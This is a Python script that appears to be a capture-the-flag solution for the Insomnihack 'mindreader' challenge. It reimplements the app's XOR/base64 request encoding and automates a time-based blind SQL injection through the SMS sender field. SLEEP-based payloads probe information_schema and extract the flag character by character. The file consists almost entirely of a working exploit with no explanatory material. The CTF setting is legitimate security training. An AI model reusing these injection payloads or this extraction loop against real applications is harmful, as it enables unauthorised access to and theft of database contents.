import base64
import sys
import requests
import json
import string
import time

test_in = "{\"device\":\"000000000000000\"}"
test_out = base64.b64decode("P2hh0V1nfMsfYk6YKwoThFxODaN1fSGeLw8k/w==")

table = [
    0x7e, 0x66, 0x31, 0x05, 0x11, 0x22, 0x2b, 0x1f,
    0x07, 0x74, 0x58, 0x19, 0x21, 0x16, 0x17, 0x05,
    0x56, 0x52, 0x09, 0x22, 0x7f, 0x61, 0x25, 0x1f,
    0x25, 0x13, 0x32, 0x33, 0x2a, 0x32, 0x32, 0x22,
    0x28, 0x51, 0x13, 0x27, 0x5b, 0x62, 0x26, 0x1e,
    0x20, 0x01, 0x0f, 0x09, 0x57, 0x1d, 0x14, 0x1e,
    0x39, 0x17, 0x1d, 0x19, 0x03, 0x50, 0x12, 0x12,
    0x02, 0x62, 0x1a, 0x7a, 0x0f, 0x4f, 0x26, 0x20,
    0x02, 0x32, 0x11, 0x11, 0x57, 0x3d, 0x2e, 0x33,
    0x0b, 0x14, 0x16, 0x0e, 0x1b, 0x60, 0x1c, 0x02,
]

crc = [ 0x3a, 0x2c, 0x34, 0xb1 ]

def encrypt(p):
    c = [0] * len(p)
    for i in range(len(p)):
        c[i] = chr(ord(p[i]) ^ crc[i % 4] ^ table[i % len(table)])
    return "".join(c)

def encode(data):
    return base64.b64encode(encrypt(json.dumps(data)))

assert(encrypt(test_in) == test_out)

URL = "http://mindreader.teaser.insomnihack.ch"

def read_mind(device_id):
    data = {
        "device": device_id
    }
    params = {
        "a": 1,
        "c": encode(data)
    }
    r = requests.get(URL, params=params)
    return r

def sms_send(device_id, date, sender, body):
    data = {
        "device": device_id,
        "date": 0,
        "sender": sender,
        "body": body
    }
    params = {
        "a": 2,
        "c": encode(data)
    }
    r = requests.get(URL, params=params)
    return r

def get_length(item):
    v = "1' AND IF(LENGTH(%s)=%d,SLEEP(1),0) AND '1"
    l = 0
    while True:
        sender = v % (item, l)
        start = time.time()
        r = sms_send("00000000000000", 1485039694124, sender, "test")
        end = time.time()
        if (end - start) > 1:
            return l
        l += 1

def get_item(item, length):
    result = ""
    v = "1' AND IF(ASCII(MID(%s,%d,1))=%d,SLEEP(1),0) AND '1"
    for i in range(length):
        for c in string.ascii_uppercase + "@{}_" + "0123456789" + string.ascii_lowercase:
            sender = v % (item, i + 1, ord(c))
            start = time.time()
            r = sms_send("00000000000000", 1485039694124, sender, "test")
            end = time.time()
            if (end - start) > 1:
                print c
                result += c
                break
    return result

# print get_length("(select table_name from information_schema.tables where MID(table_schema,1,1)=char(115) and MID(table_schema,2,1)=CHAR(109) limit 1)")
# print get_length("(select column_name from information_schema.columns where MID(table_name,1,1)=char(102) and MID(table_name,2,1)=CHAR(108) limit 1)")
# print get_item("(select column_name from information_schema.columns where MID(table_name,1,1)=char(102) and MID(table_name,2,1)=CHAR(108) limit 1)", 5)
# l = get_length("(select value from flag)")
print get_item("(select value from flag)", 30)

